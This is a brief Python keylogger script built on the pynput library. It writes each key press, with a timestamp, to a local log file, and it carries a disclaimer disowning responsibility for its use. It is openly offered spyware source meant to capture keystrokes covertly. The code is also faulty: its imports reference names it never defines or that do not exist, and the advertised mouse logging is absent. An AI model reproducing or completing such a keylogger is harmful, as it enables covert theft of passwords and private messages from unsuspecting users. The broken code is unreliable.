"""
Advanced keylogging and mouse logging using the pynput library.

DISCLAIMER :The creator of this script take no responsibility for any purposes regarding the usage of the script.
"""

from pynput.keyboard import Key, Listener as Lkey
from pynput.mouse import Lmouse

import logging

log_path = "." #modify where you want to put the path (use ABSOLUTE PATH)

logging.basicConfig(filename=(log_path + "/cS_logv1.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_type_key(key):
    logging.info(key)

with Listener(on_press=on_type_key) as listener:
    listener.join()
